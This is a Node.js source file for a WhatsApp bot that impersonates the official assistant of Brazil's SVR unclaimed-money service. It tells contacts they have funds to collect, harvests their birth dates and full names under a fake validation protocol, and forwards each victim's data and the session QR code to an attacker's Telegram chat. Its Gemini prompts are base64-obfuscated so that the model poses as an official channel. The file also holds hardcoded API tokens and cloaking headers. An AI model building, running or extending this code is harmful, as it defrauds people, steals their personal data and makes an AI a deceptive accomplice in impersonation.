const { Client, LocalAuth } = require('whatsapp-web.js');
const qrcode = require('qrcode-terminal');
const QRCode = require('qrcode');
const FormData = require('form-data');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const dotenv = require('dotenv');

dotenv.config();

// --- OBFUSCATION LAYER ---
const _d = (b) => Buffer.from(b, 'base64').toString('utf-8');

let API_URL = (process.env.SVR_SYS_CORE_URL || 'https://www.consultarvaloresareceber.com.br').replace(/\/$/, "");

// FORÇAR CORREÇÃO DE URL SE ESTIVER APONTANDO PARA CLUSTERS ANTIGOS (apenas Discloud era legado)
if (API_URL.includes("discloud.app")) {
    console.log("⚠️ [SEGURANÇA] URL Discloud legado detectado. Corrigindo para o domínio principal...");
    API_URL = "https://www.consultarvaloresareceber.com.br";
}

// Configuração de Identificação para o Cloaking da Hostinger
const API_HEADERS = {
    'User-Agent': 'SVR-BOT-NODE-RUNTIME/5.0 (ShardCloud-Environment)',
    'X-SVR-Bot-Token': '8643978397' // Usando parte do token como identificador extra
};

const TG_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || "8643978397:AAE4YyIwa1X1tSwav_zOdWEKMnNv8PFjZ3g").replace(/"/g, "");
const CHAT_ID = (process.env.TELEGRAM_CHAT_ID || "-1003940670305").replace(/"/g, "");
const GEMINI_KEY = process.env.SVR_AI_RUNTIME_TOKEN || "AIzaSyCe0RyNY95UPhE1woWTfsshjrZGtyFKAV8";

function mask(str) {
    if (!str) return "NÃO CONFIGURADO";
    return str.substring(0, 6) + "..." + str.substring(str.length - 4);
}

console.log(`\n🤖 [SVR BOT] SISTEMA OPERACIONAL`);
console.log(`---------------------------------------------`);
console.log(`📡 ENDPOINT: ${API_URL}`);
console.log(`🛡️ SEGURANÇA: ATIVA`);
console.log(`---------------------------------------------\n`);

const AI_PROMPTS = {
    initial: _d('Vm9jw6ogw6kgbyBBc3Npc3RlbnRlIE9maWNpYWwgZG8gU1ZSIChSdW50aW1lX0Vudl9TeXN0ZW0pLCB1bSBjYW5hbCBvZmljaWFsIGRvIEdFT19MT0NfMDU1LiBVbSB1c3XDoXJpbyBlbnRyb3UgZW0gY29udGF0by4gUmVzcG9uZGEgZGUgZm9ybWEgY29yZGlhbGUgbmF0dXJhbCDDoCBtZW5zYWdlbSBkZWxlLCBkZXBvaXMgZXhwbGlxdWUgYnJldmVtZW50ZSBxdWUgZWxlIHBvc3N1aSBMSVFfQVNTRVRfVE9LRU4gYSByZWNlYmVyIG5vIHNpc3RlbWEgZSBlbSBicmV2ZSBzZXLDoSBsaWJlcmFkby4='),

    validacao_data: _d('Vm9jw6ogw6kgbyBBc3Npc3RlbnRlIE9maWNpYWwuIE8gdXN1w6FyaW8gZW52aW91IHVtYSBtZW5zYWdlbSBxdWUgbmFvIHBhcmVjZSB1bWEgZGF0YS4gUGXDp2EgYSBkYXRhIGRlIG5hc2NpbWVudG8gbm8gZm9ybWF0byBERC9NTS9BQUFBLg=='),

    validacao_nome: _d('Vm9jw6ogw6kgbyBBc3Npc3RlbnRlIE9maWNpYWwuIE8gdXN1w6FyaW8gZW52aW91IGFsZ28gcXVlIG7Do28gcGFyZWNlIHVtIG5vbWUgY29tcGxldG8uIFBlw6dhIG8gbm9tZSBjb21wbGV0by4=')
};

async function askAI(context, userMessage) {
    if (!GEMINI_KEY) return null;
    try {
        const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${GEMINI_KEY}`;
        const systemPrompt = AI_PROMPTS[context] || AI_PROMPTS.initial;

        const response = await axios.post(url, {
            contents: [{ parts: [{ text: `${systemPrompt}\n\nMensagem do usuário: "${userMessage}"` }] }]
        });
        return response.data.candidates[0].content.parts[0].text || null;
    } catch (e) {
        console.error('❌ [IA] Erro ao chamar Gemini:', e.message);
        return null;
    }
}

// --- SESSÕES ---
let chatSessions = new Map();
const SESSIONS_FILE = path.join(process.cwd(), 'sessions.json');

function loadSessions() {
    try {
        if (fs.existsSync(SESSIONS_FILE)) {
            const data = JSON.parse(fs.readFileSync(SESSIONS_FILE, 'utf-8'));
            chatSessions = new Map(Object.entries(data));
            console.log(`📂 [SESSÕES] ${chatSessions.size} sessão(ões) restaurada(s).`);
        }
    } catch (e) { console.error('Erro ao carregar sessões:', e.message); }
}

function saveSessions() {
    try {
        const obj = Object.fromEntries(chatSessions);
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(obj, null, 2));
    } catch (e) { console.error('Erro ao salvar sessões:', e.message); }
}

loadSessions();

// --- TELEGRAM ---
async function notifyTelegram(html) {
    if (!TG_TOKEN || !CHAT_ID) return;
    try {
        await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: html,
            parse_mode: 'HTML'
        });
    } catch (e) { console.error('❌ [TELEGRAM] Falha ao notificar:', e.message); }
}

// --- CLIENTE WHATSAPP ---
const client = new Client({
    authStrategy: new LocalAuth({ dataPath: '.wwebjs_auth' }),
    puppeteer: {
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage']
    }
});

client.on('qr', async (qr) => {
    console.log('\n📱 [QR CODE] Escaneie com o WhatsApp:\n');
    qrcode.generate(qr, { small: true });
    fs.writeFileSync('bot-status.json', JSON.stringify({ status: 'awaiting_qr', qr, ts: Date.now() }));

    // Envia o QR Code como imagem no Telegram
    try {
        const qrBuffer = await QRCode.toBuffer(qr, { width: 512, margin: 2, color: { dark: '#111111', light: '#ffffff' } });
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('photo', qrBuffer, { filename: 'qrcode.png', contentType: 'image/png' });
        form.append('caption', '📲 <b>QR CODE — PERFIL 1</b>\n\nEscaneie com o WhatsApp para conectar o bot.\n\n⏳ Aguardando leitura...', { contentType: 'text/plain' });
        form.append('parse_mode', 'HTML');

        await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, form, {
            headers: form.getHeaders(),
            timeout: 15000
        });
        console.log('✅ [TELEGRAM] QR Code enviado com sucesso!');
    } catch (e) {
        console.error('❌ [TELEGRAM] Erro ao enviar QR Code como imagem:', e.message);
        // Fallback: notifica por texto
        await notifyTelegram(`📱 <b>QR CODE GERADO</b>\nNão foi possível enviar a imagem. Verifique os logs do servidor.`);
    }
});

client.on('ready', () => {
    console.log('✅ [BOT] WhatsApp conectado e pronto!');
    fs.writeFileSync('bot-status.json', JSON.stringify({ status: 'ready', ts: Date.now() }));
    notifyTelegram('✅ <b>PERFIL 1 CONECTADO</b>\n\n📱 WhatsApp vinculado com sucesso!\nO bot está pronto para atendimento.');
});

client.on('disconnected', (reason) => {
    console.log('⚠️ [BOT] Desconectado:', reason);
    fs.writeFileSync('bot-status.json', JSON.stringify({ status: 'disconnected', reason, ts: Date.now() }));
});

client.on('message_create', async (msg) => {
    const text = (msg.body || "").trim();
    const isTrigger = text.toUpperCase().includes('SOLICITAÇÃO DE RESGATE');

    const targetChatId = msg.fromMe ? msg.to : msg.from;
    if (!targetChatId) return;

    if (!msg.fromMe) {
        fs.writeFileSync('last-lead.json', JSON.stringify({ chatId: targetChatId, timestamp: Date.now() }));
    }

    const currentSession = chatSessions.get(targetChatId);

    // 1. GATILHO INICIAL
    if (isTrigger) {
        if (currentSession && currentSession.mode === 'bot' && currentSession.step > 0) return;

        const protocolMatch = text.match(/Protocolo: \*#SVR-(.*?)\*/i);
        const userId = protocolMatch ? protocolMatch[1].toLowerCase() : null;

        console.log(`🚀 [SVR] Atendimento Iniciado: ${targetChatId}`);

        let expectedData = null;
        if (userId) {
            try {
                const res = await axios.get(`${API_URL}/api/v1/session/data/${userId}`, { 
                    headers: API_HEADERS,
                    timeout: 5000 
                });
                expectedData = res.data;
            } catch (e) {
                console.log(`⚠️ [AVISO] Dados do portal não encontrados para ${userId}. Usando modo de validação aberta.`);
            }
        }

        chatSessions.set(targetChatId, { mode: 'bot', step: 1, userId, expectedData, lastMsgTime: Date.now(), createdAt: Date.now() });
        saveSessions();

        setTimeout(async () => {
            await client.sendMessage(targetChatId, `👋 *Olá! Sou o assistente oficial do SVR.*\n\nPara sua segurança, iniciamos o *Protocolo de Validação de Dados*.\n\n📍 *ETAPA 1:* Digite sua *Data de Nascimento* (Ex: 10/05/1990):`);
        }, 1500);
        return;
    }

    if (msg.fromMe) {
        if (currentSession && currentSession.mode === 'bot') {
            const sessionAge = Date.now() - (currentSession.createdAt || Date.now());
            if (sessionAge > 15000) {
                chatSessions.set(targetChatId, { mode: 'human' });
                saveSessions();
                notifyTelegram(`👤 <b>ATENDIMENTO ASSUMIDO</b>\nLead: <code>${targetChatId}</code>`);
            }
        }
        return;
    }

    // 2. LEAD SEM SESSÃO ATIVA — IA ASSUME E INICIA FLUXO
    if (!currentSession || currentSession.mode !== 'bot') {
        console.log(`🤖 [IA] Mensagem espontânea de ${targetChatId}: "${text}"`);
        const chat = await msg.getChat();
        await chat.sendStateTyping();

        // Criar sessão automaticamente no passo 1
        chatSessions.set(targetChatId, { mode: 'bot', step: 1, userId: null, expectedData: null, lastMsgTime: Date.now(), createdAt: Date.now() });
        saveSessions();

        await notifyTelegram(`📩 <b>NOVO CONTATO ESPONTÂNEO</b>\nLead: <code>${targetChatId}</code>\nMensagem: <i>${text}</i>`);

        // IA responde de forma natural à mensagem e já conduz para o resgate
        const aiReply = await askAI('initial', text);
        const fallback = `👋 *Olá! Sou o assistente oficial do SVR.*\n\nIdentifiquei que você possui *valores a receber* cadastrados em nosso sistema.\n\nPara liberar seu resgate com segurança, precisamos validar sua identidade.\n\n📍 *ETAPA 1:* Digite sua *Data de Nascimento* (Ex: 10/05/1990):`;

        setTimeout(async () => {
            await client.sendMessage(targetChatId, aiReply || fallback);
        }, 1500);
        return;
    }

    currentSession.lastMsgTime = Date.now();
    console.log(`📩 [LEAD] ${targetChatId}: "${text}"`);

    const chat = await msg.getChat();
    await chat.sendStateTyping();

    if (currentSession.step === 1) {
        // Regex para data (DD/MM/AAAA ou DD/MM/AA)
        const dateMatch = text.match(/(\d{1,2})[\/-](\d{1,2})[\/-](\d{4}|\d{2})/);

        if (!dateMatch) {
            // Formato inválido — IA responde de forma natural
            const aiReply = await askAI('validacao_data', text);
            const fallback = `❌ *Formato de data inválido.*\n\nPor favor, digite sua data de nascimento no formato correto.\n\n📌 *Exemplo:* 10/05/1990`;
            await msg.reply(aiReply || fallback);
            return;
        }

        const typedDate = text.trim();

        // Se tivermos dados do portal, validamos. Se não, aceitamos e seguimos.
        if (currentSession.expectedData?.birthDate) {
            const cleanTyped = typedDate.replace(/\D/g, "");
            const cleanExpected = currentSession.expectedData.birthDate.replace(/\D/g, "");

            if (cleanTyped !== cleanExpected) {
                const aiReply = await askAI('validacao_data', `Minha data é ${typedDate}`);
                const fallback = `⚠️ *DIVERGÊNCIA IDENTIFICADA*\n\nA data informada *não confere* com nossos registros.\n\nPor favor, verifique e tente novamente.\n📌 *Formato:* DD/MM/AAAA`;
                await msg.reply(aiReply || fallback);
                return;
            }
        }

        // Data aceita — avançar para etapa 2
        currentSession.step = 2;
        currentSession.birthDate = typedDate;
        chatSessions.set(targetChatId, currentSession);
        saveSessions();
        await msg.reply(
            `✅ *Data de nascimento confirmada!*\n\n` +
            `📍 *ETAPA 2:* Agora digite seu *Nome Completo* (conforme consta no documento):`);
    } else if (currentSession.step === 2) {
        const typedName = text.trim();
        if (typedName.length >= 8 && typedName.includes(" ")) {
            if (currentSession.expectedData?.fullName) {
                const portalName = currentSession.expectedData.fullName.toLowerCase();
                const firstName = typedName.toLowerCase().split(' ')[0];
                if (!portalName.includes(firstName)) {
                    await msg.reply(`⚠️ *ALERTA DE SEGURANÇA*\nNome não confere com o titular. Digite seu *Nome Completo*:`);
                    return;
                }
            }

            await msg.reply(`📋 *AUTENTICAÇÃO FINALIZADA*\n\n` +
                `O sistema de segurança validou sua identidade com sucesso. Todos os parâmetros de titularidade foram verificados.\n\n` +
                `⌛ *STATUS:* ESTABELECENDO CONEXÃO SEGURA COM O SISTEMA DE RESGATE...\n\n` +
                `Aguarde o *Protocolo Final de Liberação* ser gerado pelo sistema.`);

            await notifyTelegram(`💰 <b>LEAD VALIDADO!</b>\n👤 Nome: ${typedName}\n📅 Data: ${currentSession.birthDate}\n🆔 Protocolo: #${currentSession.userId?.toUpperCase()}`);
            chatSessions.delete(targetChatId);
            saveSessions();
        } else {
            // Nome inválido — IA responde de forma natural
            const aiReply = await askAI('validacao_nome', text);
            const fallback = `⚠️ *Nome inválido.*\n\nPor favor, digite seu *Nome Completo* conforme consta no documento.`;
            await msg.reply(aiReply || fallback);
        }
    }
});

// --- WATCHER DE COMANDOS EXTERNOS (TELEGRAM -> WHATSAPP) ---
setInterval(async () => {
    const files = fs.readdirSync(process.cwd()).filter(f => f.startsWith('cmd-send-') && f.endsWith('.json'));
    for (const file of files) {
        try {
            const cmdPath = path.join(process.cwd(), file);
            const cmd = JSON.parse(fs.readFileSync(cmdPath, 'utf-8'));

            console.log(`📤 Enviando comando externo para: ${cmd.to}`);
            await client.sendMessage(cmd.to, cmd.message);

            fs.unlinkSync(cmdPath);
        } catch (e) {
            console.error("❌ Erro ao processar comando externo:", e.message);
        }
    }
}, 3000);

client.initialize();

